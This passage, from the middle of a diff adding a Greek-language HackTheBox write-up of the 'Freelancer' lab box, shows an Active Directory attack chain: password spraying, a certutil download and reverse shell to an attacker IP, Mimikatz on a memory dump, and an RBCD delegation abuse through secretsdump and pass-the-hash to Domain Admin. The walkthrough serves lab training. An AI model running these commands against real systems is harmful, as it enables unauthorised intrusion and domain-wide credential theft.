+SQLSVCACCOUNT="FREELANCER\sql_svc"
+</span><span class="py">SQLSVCPASSWORD="IL0v3ErenY3ager"</span><span class="po">
+SAPWD="t3mp0r@ryS@PWD"</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">crackmapexec — password spray</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">crackmapexec smb 10.129.171.125 -u users.txt -p IL0v3ErenY3ager</span>
+<span class="po">SMB  DC  [-] freelancer.htb\sql_svc
+SMB  DC  [-] freelancer.htb\Administrator
+</span><span class="pg">SMB  DC  [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">RunasCs &#8212; pivot to mikasaAckerman</span></div>
+    <div class="term-body"><span class="po">SHELL&gt; certutil -split -f -urlcache http://10.10.14.16/RunasCs.exe
+SHELL&gt; .\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.16:9001</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">rlwrap nc -lvnp 9001</span>
+<span class="po">C:\WINDOWS\system32&gt; whoami</span>
+<span class="pg">freelancer\mikasaackerman</span></div>
+  </div>
+
+  <h2>Πλάγια Κίνηση &#8212; mikasaAckerman &#8594; lorra199</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">mail.txt</span></div>
+    <div class="term-body"><span class="po">PS C:\Users\mikasaAckerman\Desktop&gt; type mail.txt
+
+Hello Mikasa,
+Liza has requested me to generate a </span><span class="py">full memory dump</span><span class="po"> on the DC.
+The file is on the Desktop.</span></div>
+  </div>
+
+  <p>Ένα memory dump (<code>MEMORY.7z</code>) είναι στο Desktop. Κάν' το extract, τρέξε το Mimikatz για να απομονώσεις το <code>lsass.exe</code>, μετά τράβηξε το password του lorra199 από το SAM:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">evil-winrm &#8212; lorra199</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">evil-winrm -i 10.129.171.125 -u lorra199 -p 'PWN3D#l0rr@Armessa'</span>
+<span class="pg">*Evil-WinRM* PS C:\Users\lorra199\Documents&gt;</span></div>
+  </div>
+  <div class="alert alert-success">Αποκτήθηκε shell σαν <strong>lorra199</strong>.</div>
+
+  <h2>Καταμέτρηση Bloodhound</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">bloodhound-python</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">bloodhound-python -c ALL -u lorra199 -p 'PWN3D#l0rr@Armessa' -d freelancer.htb -ns 10.129.171.125</span></div>
+  </div>
+
+  <p>Ο <code>lorra199</code> είναι μέλος του <strong>AD Recycle Bin</strong>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-16-bc69aa17c6.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-16-bc69aa17c6.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Bloodhound: lorra199 MemberOf AD Recycle Bin" width="1211" height="418"></picture>
+
+  <p>Το <strong>AD Recycle Bin</strong> έχει <code>GenericWrite</code> πάνω στον Domain Controller <code>DC$</code>:</p>
+
+
+  <div class="alert alert-info">
+    Το <code>GenericWrite</code> στο DC$ επιτρέπει <strong>κατάχρηση RBCD</strong> — μπορούμε να ορίσουμε το attribute <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> και να κάνουμε impersonate οποιονδήποτε χρήστη συμπεριλαμβανομένου του Administrator.
+  </div>
+
+  <h2>Privilege Escalation &#8212; RBCD &#8594; Domain Admin</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">RBCD full chain</span></div>
+    <div class="term-body"><span class="pco"># 1. Πρόσθεσε ψεύτικο λογαριασμό computer</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-ip 10.129.171.125 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa'</span>
+<span class="pg">[*] Successfully added machine account ATTACKERSYSTEM$</span>
+
+<span class="pco"># 2. Γραψε το attribute delegation</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa'</span>
+<span class="pg">[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy</span>
+
+<span class="pco"># 3. Συγχρόνισε ρολόι + πάρε service ticket</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">systemctl stop systemd-timesyncd &amp;&amp; ntpdate -u 10.129.171.125</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-getST -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.129.171.125 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'</span>
+<span class="pg">[*] Saving ticket in Administrator.ccache</span>
+
+<span class="pco"># 4. Καν' τα domain credentials dump</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">export KRB5CCNAME=Administrator.ccache</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass</span>
+<span class="py">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e827463344...</span>
+
+<span class="pco"># 5. Pass-the-Hash</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">evil-winrm -i 10.129.171.125 -u Administrator -H 0039318f1e827463344...</span>
+<span class="pg">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span>
+<span class="pd">&#9492;$ </span><span class="pc">type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="py">d5be56ad************************</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; Root flag πιάστηκε. Το domain compromised.</div>
+
+  <h2>Περίληψη</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Τεχνικη</th><th>Εργαλειο</th></tr>
+    <tr><td>Foothold</td><td>Ανάκτηση λογαριασμού employer μέσω τετριμμένων security Q&amp;A</td><td>Browser</td></tr>
+    <tr><td>Πρόσβαση admin</td><td>IDOR μέσω base64 user ID στο URL OTP</td><td>Browser</td></tr>
+    <tr><td>Shell</td><td>Impersonation MSSQL sa &#8594; xp_cmdshell &#8594; PS cradle</td><td>SQL Terminal, nc</td></tr>
+    <tr><td>Πλάγιο (mikasa)</td><td>Plaintext credentials σε SQL config INI + RunasCs</td><td>crackmapexec</td></tr>
+    <tr><td>Πλάγιο (lorra)</td><td>Memory dump &#8594; Mimikatz &#8594; lsass &#8594; SAM</td><td>Mimikatz</td></tr>
+    <tr><td>Domain Admin</td><td>Κατάχρηση RBCD μέσω GenericWrite στο DC$</td><td>impacket suite</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">quick reference</span></div>
+    <div class="term-body"><span class="pco"># Privilege escalation MSSQL</span>
+<span class="pc">EXECUTE AS LOGIN = 'sa'; EXEC sp_addsrvrolemember 'user', 'sysadmin'</span>
+<span class="pc">EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE</span>
+
+<span class="pco"># αλυσίδα RBCD</span>
+<span class="pc">impacket-addcomputer   # πρόσθεσε ψεύτικο λογαριασμό machine</span>
+<span class="pc">impacket-rbcd          # γράψε attribute delegation στο DC$</span>
+<span class="pc">ntpdate -u &lt;DC_IP&gt;    # συγχρόνισε ρολόι (απέφυγε KRB_AP_ERR_SKEW)</span>
+<span class="pc">impacket-getST         # πάρε service ticket Administrator</span>
+<span class="pc">impacket-secretsdump   # καν' το NTDS dump μέσω DRSUAPI</span>
+<span class="pc">evil-winrm -H &lt;hash&gt;  # pass-the-hash σαν Administrator</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>&#169; 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">&#8592; Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
